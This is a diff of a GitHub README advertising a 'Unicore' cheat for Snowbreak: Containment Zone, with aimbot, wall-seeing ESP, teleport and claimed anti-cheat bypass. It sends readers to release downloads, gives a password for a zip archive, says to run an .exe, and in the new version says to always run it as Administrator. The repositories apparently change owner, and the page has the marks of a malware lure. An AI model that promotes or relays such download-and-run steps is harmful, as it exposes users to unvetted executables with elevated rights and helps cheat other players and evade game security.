@@ -1,67 +1,68 @@
-<div align="center">
-    <h1 style="font-size:2.5em;color:#FF4500;">🔥 UNICORE CHEAT FOR SNOWBREAK: CONTAINMENT ZONE 🔥</h1>
-    <h2 style="color:#4682B4;">Unleash Unmatched Power and Efficiency in Snowbreak</h2>
-</div>
+# 🎮 SNOWBREAK-CONTAINMENT-ZONE-CHEAT-UNICORE - Enhance Your Snowbreak Experience Effortlessly
 
----
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/dagm301006/SNOWBREAK-CONTAINMENT-ZONE-CHEAT-UNICORE/releases)
 
-<div align="center">
-    <h2 style="color:#32CD32;">📸 Screenshots</h2>
-    <img src="https://github.com/user-attachments/assets/9214fa53-daa6-4bec-ba53-e00a61cab359" alt="Unicore Cheat Screenshot 1" width="80%" style="border:2px solid #FF4500;border-radius:10px;box-shadow:5px 5px 15px rgba(0,0,0,0.5);margin-bottom:20px;">
-    <img src="https://github.com/user-attachments/assets/be154487-8ffd-4c31-aae0-d09689ec0f7b" alt="Unicore Cheat Screenshot 2" width="80%" style="border:2px solid #4682B4;border-radius:10px;box-shadow:5px 5px 15px rgba(0,0,0,0.5);margin-bottom:20px;">
-</div>
+## 🚀 Getting Started
 
----
+Welcome to the **SNOWBREAK-CONTAINMENT-ZONE-CHEAT-UNICORE**! This tool is designed to enhance your gameplay in Snowbreak: Containment Zone. You can easily find opponents and monsters, giving you a significant advantage. Follow the steps below to get started.
 
-## 🌟 **Overview**
-The **Unicore Cheat for Snowbreak: Containment Zone** is a powerful and versatile tool that empowers players to reach virtually any goal in the game with ease. Featuring an exceptional **ESP module**, it allows you to see opponents and monsters through walls. Additionally, Unicore offers a customizable **Aimbot** for precise targeting and a **Teleport feature**, enabling instant relocation to opponents for a tactical edge. The cheat is loaded with a plethora of additional functionalities such as **auto-skip for dialogues**, **infinite stamina and energy**, **damage multiplier adjustments**, **monster logic disabling**, and much more. With advanced anti-cheat bypass capabilities, Unicore ensures that the risk of account bans is nearly zero.
+## 📥 Download & Install
 
----
+To download the software, visit the releases page:
 
-## 🚀 **How to Use**
-<div style="background-color:#F5F5F5;padding:20px;border-radius:10px;">
-    <ol>
-        <li>
-            <b style="color:#FF4500;">Download:</b>  
-            <a href="https://github.com/Pristyannya/SNOWBREAK-CONTAINMENT-ZONE-CHEAT-UNICORE/releases/download/latest/UnicoreSnowbreak.zip" style="text-decoration:none;color:#4682B4;">🔹 Click here to download 🔹</a>
-        </li>
-        <li>
-            <b style="color:#32CD32;">Unzip Archive:</b>  
-            💼 Password: `UnicoreSnowbreak`
-        </li>
-        <li>
-            <b style="color:#FF4500;">Run Application:</b>  
-            Execute the `.exe` file after unzipping.
-        </li>
-        <li>
-            <b style="color:#4682B4;">Activate:</b>  
-            Press <b>HOME</b> to launch and configure the cheat.
-        </li>
-    </ol>
-</div>
+[Download from Releases Page](https://github.com/dagm301006/SNOWBREAK-CONTAINMENT-ZONE-CHEAT-UNICORE/releases)
 
----
+1. Click the link above. This will direct you to our Releases page.
+2. Look for the latest version of the software. 
+3. Click the file name to download it to your computer.
 
-<div align="center">
-    <h2 style="color:#32CD32;">💡 FEATURES</h2>
-</div>
-<div align="center">
-    <h2 style="color:#32CD32;">📸 Screenshots</h2>
-    <img src="https://github.com/user-attachments/assets/8b40e640-d253-4db6-94bd-8fd133df4a8d" alt="Unicore Cheat Screenshot 1" width="80%" style="border:2px solid #FF4500;border-radius:10px;box-shadow:5px 5px 15px rgba(0,0,0,0.5);margin-bottom:20px;">
-</div>
+### 🖥️ System Requirements
 
----
+- **Operating System:** Windows 10 or later
+- **CPU:** Dual-core processor or better
+- **RAM:** Minimum of 4 GB
+- **Graphics:** DirectX 11 compatible graphics card
+- **Internet:** Broadband connection for online features
 
-## 📄 **License**
-<div style="background-color:#F5F5F5;padding:20px;border-radius:10px;">
-    This project is licensed under the **MIT License**. See the LICENSE file for details.
-</div>
+## 🔧 How to Run the Software
 
----
+Once you have downloaded the software, follow these steps:
 
-<div align="center">
-    <h2 style="color:#4682B4;">📬 CONTACT</h2>
-    <p>Need help? Reach out to us:</p>
-    <a href="" style="text-decoration:none;color:#FF4500;">GitHub</a>  
-    Email: <b style="color:#32CD32;">support@unicorecheats.com</b>
-</div>
+1. Locate the downloaded file on your computer. 
+2. Double-click the file to start the installation.
+3. Follow the on-screen instructions to complete the installation. 
+4. Once installed, open the application from the shortcut on your desktop or the installation directory.
+
+## 🎯 Key Features
+
+- **ESP Module:** See opponents and monsters through walls for better strategy.
+- **Aimbot Functionality:** Automatic aiming to improve accuracy.
+- **Teleportation:** Move instantly to different locations within the game map.
+- **Custom Settings:** Adjust features to suit your playstyle.
+
+## ⚙️ Configuration
+
+After running the software, configure it to fit your needs:
+
+1. Open the software.
+2. Navigate to the settings menu.
+3. Customize options like ESP visibility and aimbot sensitivity.
+4. Save your settings for a smoother experience.
+
+## 📌 Important Tips
+
+- Always run the software as an Administrator for full functionality.
+- Check for updates regularly on the Releases page for the latest features and fixes.
+- Read the user manual included in the software for detailed guides on features.
+
+## 😃 Support
+
+If you encounter any issues, feel free to reach out for assistance. You can check the FAQ section in the user manual or ask for help in the community.
+
+## 🎉 Conclusion
+
+Enjoy exploring the vast world of Snowbreak: Containment Zone. With the **SNOWBREAK-CONTAINMENT-ZONE-CHEAT-UNICORE**, you have the tools you need to excel in the game. 
+
+[Visit the Releases Page to Download Again](https://github.com/dagm301006/SNOWBREAK-CONTAINMENT-ZONE-CHEAT-UNICORE/releases)
+
+Happy gaming!
